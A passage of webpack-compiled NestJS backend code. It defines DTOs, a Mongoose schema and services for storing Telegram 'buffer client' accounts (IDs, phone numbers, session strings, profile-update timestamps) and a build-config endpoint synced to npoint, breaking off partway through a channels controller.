exports.BufferClientService = BufferClientService = BufferClientService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('bufferClientModule')),
    __param(1, (0, common_1.Inject)((0, common_1.forwardRef)(() => Telegram_service_1.TelegramService))),
    __param(2, (0, common_1.Inject)((0, common_1.forwardRef)(() => users_service_1.UsersService))),
    __param(3, (0, common_1.Inject)((0, common_1.forwardRef)(() => active_channels_service_1.ActiveChannelsService))),
    __param(4, (0, common_1.Inject)((0, common_1.forwardRef)(() => client_service_1.ClientService))),
    __param(5, (0, common_1.Inject)((0, common_1.forwardRef)(() => channels_service_1.ChannelsService))),
    __param(6, (0, common_1.Inject)((0, common_1.forwardRef)(() => promote_client_service_1.PromoteClientService))),
    __param(7, (0, common_1.Inject)((0, common_1.forwardRef)(() => session_manager_1.SessionService))),
    __metadata("design:paramtypes", [mongoose_2.Model,
        Telegram_service_1.TelegramService,
        users_service_1.UsersService,
        active_channels_service_1.ActiveChannelsService,
        client_service_1.ClientService,
        channels_service_1.ChannelsService,
        promote_client_service_1.PromoteClientService,
        session_manager_1.SessionService,
        bots_1.BotsService])
], BufferClientService);


/***/ }),

/***/ "./src/components/buffer-clients/dto/create-buffer-client.dto.ts":
/*!***********************************************************************!*\
  !*** ./src/components/buffer-clients/dto/create-buffer-client.dto.ts ***!
  \***********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.CreateBufferClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class CreateBufferClientDto {
}
exports.CreateBufferClientDto = CreateBufferClientDto;
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Telegram ID of the client',
        example: '123456789',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "tgId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Mobile number of the client',
        example: '+1234567890',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Date of the session',
        example: '2023-06-22',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "availableDate", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Session identifier',
        example: 'session123',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "session", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Channel Count',
        example: 23,
        type: Number
    }),
    (0, class_validator_1.IsNumber)(),
    __metadata("design:type", Number)
], CreateBufferClientDto.prototype, "channels", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Client ID that this buffer client belongs to',
        example: 'client123',
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Status of the buffer client',
        example: 'active',
        enum: ['active', 'inactive'],
        default: 'active',
        required: false,
    }),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Status message for the promote client',
        example: 'Account is functioning properly',
        default: 'Account is functioning properly',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], CreateBufferClientDto.prototype, "message", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Last used timestamp for the promote client',
        example: '2023-06-22T10:30:00.000Z',
        required: false
    }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsDateString)(),
    __metadata("design:type", Date)
], CreateBufferClientDto.prototype, "lastUsed", void 0);


/***/ }),

/***/ "./src/components/buffer-clients/dto/index.ts":
/*!****************************************************!*\
  !*** ./src/components/buffer-clients/dto/index.ts ***!
  \****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./create-buffer-client.dto */ "./src/components/buffer-clients/dto/create-buffer-client.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./search-buffer-client.dto */ "./src/components/buffer-clients/dto/search-buffer-client.dto.ts"), exports);
__exportStar(__webpack_require__(/*! ./update-buffer-client.dto */ "./src/components/buffer-clients/dto/update-buffer-client.dto.ts"), exports);


/***/ }),

/***/ "./src/components/buffer-clients/dto/search-buffer-client.dto.ts":
/*!***********************************************************************!*\
  !*** ./src/components/buffer-clients/dto/search-buffer-client.dto.ts ***!
  \***********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.SearchBufferClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const class_transformer_1 = __webpack_require__(/*! class-transformer */ "class-transformer");
const class_validator_1 = __webpack_require__(/*! class-validator */ "class-validator");
class SearchBufferClientDto {
}
exports.SearchBufferClientDto = SearchBufferClientDto;
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Mobile number to search for' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "mobile", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Client ID to search for' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "clientId", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Username to search for' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "username", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Name to search for' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "name", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Channel link to search for' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "channelLink", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Repl link to search for' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "repl", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by active status' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsBoolean)(),
    (0, class_transformer_1.Transform)(({ value }) => value === 'true' || value === true),
    __metadata("design:type", Boolean)
], SearchBufferClientDto.prototype, "isActive", void 0);
__decorate([
    (0, swagger_1.ApiPropertyOptional)({ description: 'Filter by tgId' }),
    (0, class_validator_1.IsOptional)(),
    (0, class_validator_1.IsString)(),
    __metadata("design:type", String)
], SearchBufferClientDto.prototype, "tgId", void 0);


/***/ }),

/***/ "./src/components/buffer-clients/dto/update-buffer-client.dto.ts":
/*!***********************************************************************!*\
  !*** ./src/components/buffer-clients/dto/update-buffer-client.dto.ts ***!
  \***********************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {


Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpdateBufferClientDto = void 0;
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_buffer_client_dto_1 = __webpack_require__(/*! ./create-buffer-client.dto */ "./src/components/buffer-clients/dto/create-buffer-client.dto.ts");
class UpdateBufferClientDto extends (0, swagger_1.PartialType)(create_buffer_client_dto_1.CreateBufferClientDto) {
}
exports.UpdateBufferClientDto = UpdateBufferClientDto;


/***/ }),

/***/ "./src/components/buffer-clients/index.ts":
/*!************************************************!*\
  !*** ./src/components/buffer-clients/index.ts ***!
  \************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./buffer-client.controller */ "./src/components/buffer-clients/buffer-client.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./buffer-client.service */ "./src/components/buffer-clients/buffer-client.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./dto */ "./src/components/buffer-clients/dto/index.ts"), exports);
__exportStar(__webpack_require__(/*! ./schemas */ "./src/components/buffer-clients/schemas/index.ts"), exports);


/***/ }),

/***/ "./src/components/buffer-clients/schemas/buffer-client.schema.ts":
/*!***********************************************************************!*\
  !*** ./src/components/buffer-clients/schemas/buffer-client.schema.ts ***!
  \***********************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BufferClientSchema = exports.BufferClient = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
let BufferClient = class BufferClient {
};
exports.BufferClient = BufferClient;
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "tgId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, unique: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "mobile", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "session", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "availableDate", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true, type: Number }),
    __metadata("design:type", Number)
], BufferClient.prototype, "channels", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: true }),
    __metadata("design:type", String)
], BufferClient.prototype, "clientId", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, default: 'Account is functioning properly' }),
    __metadata("design:type", String)
], BufferClient.prototype, "message", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], BufferClient.prototype, "lastUsed", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], BufferClient.prototype, "lastChecked", void 0);
__decorate([
    (0, mongoose_1.Prop)({
        required: true,
        enum: ['active', 'inactive'],
        default: 'active',
        type: String,
        description: 'Status of the buffer client',
    }),
    __metadata("design:type", String)
], BufferClient.prototype, "status", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Boolean, default: false }),
    __metadata("design:type", Boolean)
], BufferClient.prototype, "inUse", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], BufferClient.prototype, "privacyUpdatedAt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], BufferClient.prototype, "profilePicsUpdatedAt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], BufferClient.prototype, "nameBioUpdatedAt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], BufferClient.prototype, "profilePicsDeletedAt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], BufferClient.prototype, "usernameUpdatedAt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], BufferClient.prototype, "createdAt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], BufferClient.prototype, "updatedAt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], BufferClient.prototype, "lastUpdateAttempt", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Number, default: 0 }),
    __metadata("design:type", Number)
], BufferClient.prototype, "failedUpdateAttempts", void 0);
__decorate([
    (0, mongoose_1.Prop)({ required: false, type: Date, default: null }),
    __metadata("design:type", Date)
], BufferClient.prototype, "lastUpdateFailure", void 0);
exports.BufferClient = BufferClient = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'bufferClients', versionKey: false, autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], BufferClient);
exports.BufferClientSchema = mongoose_1.SchemaFactory.createForClass(BufferClient);


/***/ }),

/***/ "./src/components/buffer-clients/schemas/index.ts":
/*!********************************************************!*\
  !*** ./src/components/buffer-clients/schemas/index.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./buffer-client.schema */ "./src/components/buffer-clients/schemas/buffer-client.schema.ts"), exports);


/***/ }),

/***/ "./src/components/builds/build.controller.ts":
/*!***************************************************!*\
  !*** ./src/components/builds/build.controller.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const build_service_1 = __webpack_require__(/*! ./build.service */ "./src/components/builds/build.service.ts");
const interceptors_1 = __webpack_require__(/*! ../../interceptors */ "./src/interceptors/index.ts");
const decorators_1 = __webpack_require__(/*! ../../decorators */ "./src/decorators/index.ts");
let BuildController = class BuildController {
    constructor(buildService) {
        this.buildService = buildService;
    }
    async findOne() {
        return this.buildService.findOne();
    }
    async update(updateClientDto) {
        return this.buildService.update(updateClientDto);
    }
};
exports.BuildController = BuildController;
__decorate([
    (0, common_1.Get)(),
    (0, common_1.UseInterceptors)(interceptors_1.CloudflareCacheInterceptor),
    (0, decorators_1.NoCache)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get build data' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], BuildController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update build' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], BuildController.prototype, "update", null);
exports.BuildController = BuildController = __decorate([
    (0, swagger_1.ApiTags)('Build'),
    (0, common_1.Controller)('builds'),
    __metadata("design:paramtypes", [build_service_1.BuildService])
], BuildController);


/***/ }),

/***/ "./src/components/builds/build.module.ts":
/*!***********************************************!*\
  !*** ./src/components/builds/build.module.ts ***!
  \***********************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const build_service_1 = __webpack_require__(/*! ./build.service */ "./src/components/builds/build.service.ts");
const build_controller_1 = __webpack_require__(/*! ./build.controller */ "./src/components/builds/build.controller.ts");
const builds_schema_1 = __webpack_require__(/*! ./builds.schema */ "./src/components/builds/builds.schema.ts");
const npoint_module_1 = __webpack_require__(/*! ../n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let BuildModule = class BuildModule {
};
exports.BuildModule = BuildModule;
exports.BuildModule = BuildModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            BuildModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'buildModule', collection: 'builds', schema: builds_schema_1.BuildSchema }]),
            npoint_module_1.NpointModule,
        ],
        providers: [build_service_1.BuildService],
        controllers: [build_controller_1.BuildController],
        exports: [BuildModule],
    })
], BuildModule);


/***/ }),

/***/ "./src/components/builds/build.service.ts":
/*!************************************************!*\
  !*** ./src/components/builds/build.service.ts ***!
  \************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const npoint_service_1 = __webpack_require__(/*! ../n-point/npoint.service */ "./src/components/n-point/npoint.service.ts");
let BuildService = class BuildService {
    constructor(buildModel, npointSerive) {
        this.buildModel = buildModel;
        this.npointSerive = npointSerive;
    }
    async OnModuleInit() {
        console.log("Config Module Inited");
    }
    async findOne() {
        const user = await this.buildModel.findOne({}).exec();
        if (!user) {
            throw new common_1.NotFoundException(`buildModel not found`);
        }
        return user;
    }
    async update(updateClientDto) {
        delete updateClientDto['_id'];
        const updatedUser = await this.buildModel.findOneAndUpdate({}, { $set: { ...updateClientDto } }, { new: true, upsert: true }).exec();
        try {
            await this.npointSerive.updateDocument("3375d15db1eece560188", updatedUser);
            console.log("Updated document successfully in npoint");
        }
        catch (error) {
            console.log(error);
        }
        if (!updatedUser) {
            throw new common_1.NotFoundException(`buildModel not found`);
        }
        return updatedUser;
    }
};
exports.BuildService = BuildService;
exports.BuildService = BuildService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('buildModule')),
    __metadata("design:paramtypes", [mongoose_2.Model,
        npoint_service_1.NpointService])
], BuildService);


/***/ }),

/***/ "./src/components/builds/builds.schema.ts":
/*!************************************************!*\
  !*** ./src/components/builds/builds.schema.ts ***!
  \************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.BuildSchema = exports.Build = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let Build = class Build {
};
exports.Build = Build;
exports.Build = Build = __decorate([
    (0, mongoose_1.Schema)({ versionKey: false, autoIndex: true, strict: false, timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                delete ret._id;
            },
        }, })
], Build);
exports.BuildSchema = mongoose_1.SchemaFactory.createForClass(Build);
exports.BuildSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/builds/index.ts":
/*!****************************************!*\
  !*** ./src/components/builds/index.ts ***!
  \****************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __exportStar = (this && this.__exportStar) || function(m, exports) {
    for (var p in m) if (p !== "default" && !Object.prototype.hasOwnProperty.call(exports, p)) __createBinding(exports, m, p);
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
__exportStar(__webpack_require__(/*! ./build.controller */ "./src/components/builds/build.controller.ts"), exports);
__exportStar(__webpack_require__(/*! ./build.module */ "./src/components/builds/build.module.ts"), exports);
__exportStar(__webpack_require__(/*! ./build.service */ "./src/components/builds/build.service.ts"), exports);
__exportStar(__webpack_require__(/*! ./builds.schema */ "./src/components/builds/builds.schema.ts"), exports);


/***/ }),

/***/ "./src/components/channels/channels.controller.ts":
/*!********************************************************!*\
  !*** ./src/components/channels/channels.controller.ts ***!
  \********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.ChannelsController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const channels_service_1 = __webpack_require__(/*! ./channels.service */ "./src/components/channels/channels.service.ts");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const search_channel_dto_1 = __webpack_require__(/*! ./dto/search-channel.dto */ "./src/components/channels/dto/search-channel.dto.ts");
const create_channel_dto_1 = __webpack_require__(/*! ./dto/create-channel.dto */ "./src/components/channels/dto/create-channel.dto.ts");
const update_channel_dto_1 = __webpack_require__(/*! ./dto/update-channel.dto */ "./src/components/channels/dto/update-channel.dto.ts");
let ChannelsController = class ChannelsController {
    constructor(channelsService) {
        this.channelsService = channelsService;
    }
    async create(createChannelDto) {
        return this.channelsService.create(createChannelDto);
    }
    async createMultiple(createChannelDtos) {
        return this.channelsService.createMultiple(createChannelDtos);
    }
    search(query) {
        console.log(query);
        return this.channelsService.search(query);
    }
    async findAll() {
        return this.channelsService.findAll();
    }
    async findOne(channelId) {
        return this.channelsService.findOne(channelId);
    }
    async update(channelId, updateChannelDto) {
        return this.channelsService.update(channelId, updateChannelDto);
    }
    async remove(channelId) {
        return this.channelsService.remove(channelId);
    }
};
exports.ChannelsController = ChannelsController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new  channel' }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_channel_dto_1.CreateChannelDto]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "create", null);
__decorate([
    (0, common_1.Post)('createMultiple'),
    (0, swagger_1.ApiOperation)({ summary: 'Create multiple channels' }),
    (0, swagger_1.ApiBody)({ type: [create_channel_dto_1.CreateChannelDto] }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Array]),
    __metadata("design:returntype", Promise)
], ChannelsController.prototype, "createMultiple", null);
__decorate([
    (0, common_1.Get)('search'),
    (0, swagger_1.ApiOperation)({ summary: 'Search channels by filters' }),
    (0, swagger_1.ApiQuery)({ name: 'channelId', required: false, type: String }),
